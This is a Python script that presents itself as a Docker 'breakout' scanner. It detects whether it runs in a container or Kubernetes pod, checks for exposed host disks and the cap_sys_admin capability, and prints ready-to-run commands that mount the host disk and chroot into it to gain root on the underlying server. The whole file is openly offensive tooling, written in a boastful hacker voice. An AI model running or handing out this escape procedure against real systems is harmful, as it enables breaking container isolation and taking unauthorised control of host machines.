import os
import subprocess

def check_docker_breakout():
    print("\n[*] Bhai, starting Docker Container Breakout (Escapist) Scanner...")
    print("[*] Checking if we are trapped inside a container and how to break out!\n")
    print("==================================================")

    # Step 1: Check if we are inside a Docker container
    print("[+] Step 1: Am I inside a container?")
    is_docker = False
    
    if os.path.exists('/.dockerenv'):
        print("   [!] YES! Found '/.dockerenv'. We are trapped inside a Docker Container.")
        is_docker = True
    else:
        try:
            cgroup = subprocess.check_output('cat /proc/1/cgroup', shell=True).decode()
            if 'docker' in cgroup or 'kubepods' in cgroup:
                print("   [!] YES! Found container signatures in '/proc/1/cgroup'. We are inside a Container/Kubernetes pod.")
                is_docker = True
        except Exception:
            pass

    if not is_docker:
        print("   [-] Nope. You are on a bare-metal host or a full VM. No need to escape, just PrivEsc normally!")
        print("==================================================")
        return

    # Step 2: Check for Privileged Mode (Can we see the host's hard drives?)
    print("\n[+] Step 2: Hunting for '--privileged' misconfigurations...")
    
    try:
        # Checking for host disks mapped to the container
        disks = subprocess.check_output("fdisk -l 2>/dev/null | grep -o '^/dev/[a-z]*[0-9]*'", shell=True).decode().strip().split('\n')
        disks = [d for d in disks if d] # Remove empty strings
        
        if disks:
            print("   [!!!] JACKPOT 🎯 WE FOUND HOST HARD DRIVES EXPOSED!")
            for disk in disks:
                print(f"       -> Found Disk: {disk}")
                
            print(f"\n   [!!!] HACKER ACTION: Run these exact commands to Break Out and get HOST ROOT:")
            print(f"         1. mkdir -p /mnt/host_os")
            print(f"         2. mount {disks[0]} /mnt/host_os")
            print(f"         3. chroot /mnt/host_os bash")
            print("         [+] BOOM! You have escaped the container and are now ROOT on the main server! 💀")
        else:
            print("   [-] No host drives exposed via fdisk. Checking capabilities...")
            
            # Alternative check using capsh
            caps = subprocess.check_output("capsh --print 2>/dev/null | grep 'Current:'", shell=True).decode().strip()
            if "cap_sys_admin" in caps:
                 print("   [!!!] JACKPOT 🎯 Container has 'cap_sys_admin' (God Mode) capability!")
                 print("   [!!!] Look up 'cap_sys_admin docker escape' on GTFOBins or HackTricks to break out.")
            else:
                 print("   [-] Container seems securely isolated. Breakout will require a kernel exploit.")

    except Exception as e:
        print(f"   [-] Could not check privileges (Maybe missing tools): {e}")
        print("   [!] Try running manually: fdisk -l  OR  ls -la /dev/sd*")

    print("\n==================================================")
    print("[+] Docker Breakout Scan Complete, Bhai!")

if __name__ == "__main__":
    check_docker_breakout()
